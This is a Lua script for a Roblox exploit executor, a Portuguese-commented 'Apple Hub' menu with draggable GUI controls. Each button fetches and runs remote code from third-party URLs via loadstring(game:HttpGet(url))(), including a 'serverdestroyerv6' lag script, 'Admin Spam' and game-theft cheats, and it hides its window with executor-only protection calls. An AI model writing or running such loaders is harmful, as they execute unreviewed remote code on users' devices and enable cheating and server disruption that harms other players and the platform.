-- 🍎 Apple Hub - Versão Completa Otimizada
-- 🚀 Drag 100% funcional + Todos scripts + Design limpo

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

-- Configurações
local player = Players.LocalPlayer
local isMobile = UserInputService.TouchEnabled
local screenSize = workspace.CurrentCamera.ViewportSize

-- Tamanhos responsivos
local frameWidth = isMobile and screenSize.X * 0.9 or 420
local frameHeight = 550
local minimizedHeight = 45

-- GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "AppleHubPro"
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false

-- Proteção
if syn and syn.protect_gui then
    syn.protect_gui(ScreenGui)
    ScreenGui.Parent = game.CoreGui
elseif gethui then
    ScreenGui.Parent = gethui()
else
    ScreenGui.Parent = player:WaitForChild("PlayerGui")
end

-- Frame principal
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, frameWidth, 0, frameHeight)
MainFrame.Position = UDim2.new(0.5, -frameWidth/2, 0.5, -frameHeight/2)
MainFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainFrame.BorderSizePixel = 0
MainFrame.ClipsDescendants = true

-- Estilização
local Border = Instance.new("UIStroke")
Border.Color = Color3.fromRGB(50, 50, 50)
Border.Thickness = 1
Border.Parent = MainFrame

local Corner = Instance.new("UICorner")
Corner.CornerRadius = UDim.new(0, 12)
Corner.Parent = MainFrame

-- Barra de título (ÁREA DO DRAG)
local TitleBar = Instance.new("Frame")
TitleBar.Name = "TitleBar"
TitleBar.Size = UDim2.new(1, 0, 0, 45)
TitleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
TitleBar.BorderSizePixel = 0

-- Botões de controle
local ControlFrame = Instance.new("Frame")
ControlFrame.Size = UDim2.new(0, 70, 1, 0)
ControlFrame.Position = UDim2.new(1, -75, 0, 0)
ControlFrame.BackgroundTransparency = 1

local MinimizeButton = Instance.new("TextButton")
MinimizeButton.Size = UDim2.new(0, 30, 0, 30)
MinimizeButton.Position = UDim2.new(0, 5, 0.5, -15)
MinimizeButton.BackgroundColor3 = Color3.fromRGB(255, 193, 7)
MinimizeButton.Text = "─"
MinimizeButton.TextColor3 = Color3.new(0, 0, 0)
MinimizeButton.TextSize = 16

local CloseButton = Instance.new("TextButton")
CloseButton.Size = UDim2.new(0, 30, 0, 30)
CloseButton.Position = UDim2.new(0, 40, 0.5, -15)
CloseButton.BackgroundColor3 = Color3.fromRGB(244, 67, 54)
CloseButton.Text = "✕"
CloseButton.TextColor3 = Color3.new(1, 1, 1)
CloseButton.TextSize = 16

-- Título
local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = UDim2.new(1, -80, 1, 0)
TitleLabel.Position = UDim2.new(0, 10, 0, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "🍎 APPLE HUB"
TitleLabel.TextColor3 = Color3.new(1, 1, 1)
TitleLabel.TextSize = 18
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.TextXAlignment = Enum.TextXAlignment.Left

-- Área de scripts
local ScriptsFrame = Instance.new("ScrollingFrame")
ScriptsFrame.Size = UDim2.new(1, -20, 1, -65)
ScriptsFrame.Position = UDim2.new(0, 10, 0, 55)
ScriptsFrame.BackgroundTransparency = 1
ScriptsFrame.ScrollBarThickness = 4
ScriptsFrame.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 100)

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Padding = UDim.new(0, 10)
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center

-- Montar interface
MainFrame.Parent = ScreenGui
TitleBar.Parent = MainFrame
ControlFrame.Parent = TitleBar
MinimizeButton.Parent = ControlFrame
CloseButton.Parent = ControlFrame
TitleLabel.Parent = TitleBar
ScriptsFrame.Parent = MainFrame
UIListLayout.Parent = ScriptsFrame

-- Lista de scripts
local scripts = {
    {name = "Nameless", icon = "👑", color = Color3.fromRGB(255, 215, 0), url = "https://raw.githubusercontent.com/ily123950/Vulkan/main/Tr"},
    {name = "Chilli Hub", icon = "🌶️", color = Color3.fromRGB(255, 69, 58), url = "https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua"},
    {name = "UCT Hub", icon = "⚡", color = Color3.fromRGB(0, 191, 255), url = "https://raw.githubusercontent.com/UCT-hub/main/main/stealabrainrot"},
    {name = "Kurd Hub", icon = "🏔️", color = Color3.fromRGB(34, 139, 34), url = "https://raw.githubusercontent.com/Ninja10908/S4/main/Kurdhub"},
    {name = "Lag + Aura", icon = "💀", color = Color3.fromRGB(178, 34, 34), url = "https://tcscripts.discloud.app/scripts/serverdestroyerv6"},
    {name = "Admin Spam", icon = "👑", color = Color3.fromRGB(255, 215, 0), url = "https://api.luarmor.net/files/v3/loaders/fc9523e876bada3b7ed4ebe004cb8cf9.lua"},
    {name = "Chilli Private", icon = "🔓", color = Color3.fromRGB(0, 200, 83), url = "https://raw.githubusercontent.com/tienkhanh1/spicy/main/PrivateServer"},
    {name = "Speed Steal", icon = "⚡", color = Color3.fromRGB(0, 150, 255), url = "https://pastebin.com/raw/rmxfZDPd"}
}

-- Criar botões
for _, scriptData in ipairs(scripts) do
    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0.95, 0, 0, 60)
    button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    button.BorderSizePixel = 0
    button.Text = ""
    button.AutoButtonColor = false
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = button
    
    -- Ícone
    local icon = Instance.new("TextLabel")
    icon.Size = UDim2.new(0, 40, 0, 40)
    icon.Position = UDim2.new(0, 10, 0.5, -20)
    icon.BackgroundTransparency = 1
    icon.Text = scriptData.icon
    icon.TextSize = 24
    icon.TextColor3 = scriptData.color
    icon.Font = Enum.Font.GothamBold
    icon.Parent = button
    
    -- Nome
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, -60, 1, 0)
    label.Position = UDim2.new(0, 60, 0, 0)
    label.BackgroundTransparency = 1
    label.Text = scriptData.name
    label.TextSize = 16
    label.TextColor3 = Color3.new(1, 1, 1)
    label.Font = Enum.Font.GothamBold
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.Parent = button
    
    -- Efeito hover
    if not isMobile then
        button.MouseEnter:Connect(function()
            button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
        end)
        
        button.MouseLeave:Connect(function()
            button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
        end)
    end
    
    -- Executar script
    button.MouseButton1Click:Connect(function()
        -- Animação de clique
        local originalColor = button.BackgroundColor3
        local originalIcon = icon.Text
        local originalText = label.Text
        
        button.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
        icon.Text = "⏳"
        label.Text = "Executando..."
        
        task.wait(0.2)
        button.BackgroundColor3 = originalColor
        
        -- Executar
        local success, err = pcall(function()
            if scriptData.name == "Lag + Aura" then
                getgenv().ServerDestroyerV6 = {Comprar = false, Spam = true}
            end
            loadstring(game:HttpGet(scriptData.url))()
        end)
        
        if success then
            icon.Text = "✅"
            label.Text = "Sucesso!"
        else
            icon.Text = "❌"
            label.Text = "Erro!"
            warn("Erro:", err)
        end
        
        task.wait(1.5)
        icon.Text = originalIcon
        label.Text = originalText
    end)
    
    if isMobile then
        button.TouchTap:Connect(function()
            button.MouseButton1Click:Fire()
        end)
    end
    
    button.Parent = ScriptsFrame
end

-- 🔥 SISTEMA DE DRAG SIMPLES E FUNCIONAL
local dragging = false
local dragStart, frameStart

TitleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or 
       (isMobile and input.UserInputType == Enum.UserInputType.Touch) then
        dragging = true
        dragStart = input.Position
        frameStart = MainFrame.Position
        
        local connection
        connection = input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
                connection:Disconnect()
            end
        end)
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or 
       input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(
            frameStart.X.Scale,
            frameStart.X.Offset + delta.X,
            frameStart.Y.Scale,
            frameStart.Y.Offset + delta.Y
        )
    end
end)

-- Minimizar/Fechar
local minimized = false

MinimizeButton.MouseButton1Click:Connect(function()
    minimized = not minimized
    
    if minimized then
        MainFrame:TweenSize(UDim2.new(0, frameWidth, 0, minimizedHeight), "Out", "Quad", 0.2)
        ScriptsFrame.Visible = false
        MinimizeButton.Text = "+"
    else
        MainFrame:TweenSize(UDim2.new(0, frameWidth, 0, frameHeight), "Out", "Quad", 0.2)
        ScriptsFrame.Visible = true
        MinimizeButton.Text = "─"
    end
end)

CloseButton.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

-- Ajustar tamanho do canvas
UIListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    ScriptsFrame.CanvasSize = UDim2.new(0, 0, 0, UIListLayout.AbsoluteContentSize.Y + 10)
end)

-- Animações de entrada
MainFrame.BackgroundTransparency = 1
TitleBar.BackgroundTransparency = 1

for i = 1, 20 do
    MainFrame.BackgroundTransparency = 1 - (i/20)
    TitleBar.BackgroundTransparency = 1 - (i/20)
    task.wait(0.01)
end

-- Feedback inicial
print("==================================")
print("🍎 APPLE HUB - Carregado!")
print("📱 Dispositivo: " .. (isMobile and "Mobile" or "PC"))
print("🖱️  Arraste pela barra preta")
print("🎯 Scripts: " .. #scripts .. " disponíveis")
print("==================================")

-- Indicador visual do drag (remove após 3s)
local dragHint = Instance.new("TextLabel")
dragHint.Size = UDim2.new(1, 0, 0, 20)
dragHint.Position = UDim2.new(0, 0, 1, 5)
dragHint.BackgroundTransparency = 1
dragHint.Text = "🖱️ Arraste-me pela barra superior"
dragHint.TextColor3 = Color3.fromRGB(100, 100, 100)
dragHint.TextSize = 12
dragHint.Font = Enum.Font.Gotham
dragHint.TextXAlignment = Enum.TextXAlignment.Center
dragHint.Parent = MainFrame

task.wait(3)
dragHint:Destroy()

-- Sistema de notificações rápidas
local function notify(message, color)
    local notif = Instance.new("TextLabel")
    notif.Size = UDim2.new(1, -20, 0, 35)
    notif.Position = UDim2.new(0, 10, 0, -40)
    notif.BackgroundColor3 = color
    notif.TextColor3 = Color3.new(1, 1, 1)
    notif.Text = message
    notif.TextSize = 14
    notif.Font = Enum.Font.GothamBold
    notif.TextXAlignment = Enum.TextXAlignment.Center
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = notif
    
    notif.Parent = MainFrame
    
    notif:TweenPosition(UDim2.new(0, 10, 0, 10), "Out", "Quad", 0.3)
    task.wait(2)
    notif:TweenPosition(UDim2.new(0, 10, 0, -40), "Out", "Quad", 0.3)
    task.wait(0.3)
    notif:Destroy()
end

-- Notificação de boas-vindas
task.wait(0.5)
notify("🍎 Apple Hub Pronto!", Color3.fromRGB(0, 150, 255))
